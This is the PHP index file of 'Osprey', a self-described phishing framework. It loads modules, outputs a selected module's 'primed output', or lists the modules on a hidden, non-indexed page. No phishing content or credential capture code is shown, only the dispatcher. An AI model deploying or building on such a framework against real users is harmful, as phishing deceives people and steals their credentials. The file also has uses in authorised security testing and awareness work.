<?php

/**
 * Osprey - A PHP Phishing Framework
 *
 * @package  Osprey
 * @author   https://github.com/jaylinski
 */


/*
|--------------------------------------------------------------------------
| Call Composer Autoloader and create Osprey
|--------------------------------------------------------------------------
*/

require __DIR__.'/../vendor/autoload.php';
$osprey = new Osprey\Osprey;

/*
|--------------------------------------------------------------------------
| If Module is selected, get Module and ouput data.
|--------------------------------------------------------------------------
*/

if(isset($_REQUEST['module']) && !empty($_REQUEST['module']))
{
	$module = $osprey->getModule($_REQUEST['module']);	
	echo $module->getPrimedOutput();
}

/*
|--------------------------------------------------------------------------
| If no Module is selected, show available Modules to user
|--------------------------------------------------------------------------
*/

else
{
	
?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="robots" content="noindex,nofollow" />	
	<title>osprey</title>
	<link rel="stylesheet" href="assets/styles.css" type="text/css" media="all" />
</head>
<body>
	<h1>Osprey</h1>
	<div class="content">
		<div class="pull-left">
			<ul>
			<?php $osprey->printModules(); ?>
			</ul>
		</div>
		<div class="pull-right">
			<img src="assets/osprey.jpg" alt="Osprey" />
		</div>
	</div>
</body>
</html>
<?php

}

?>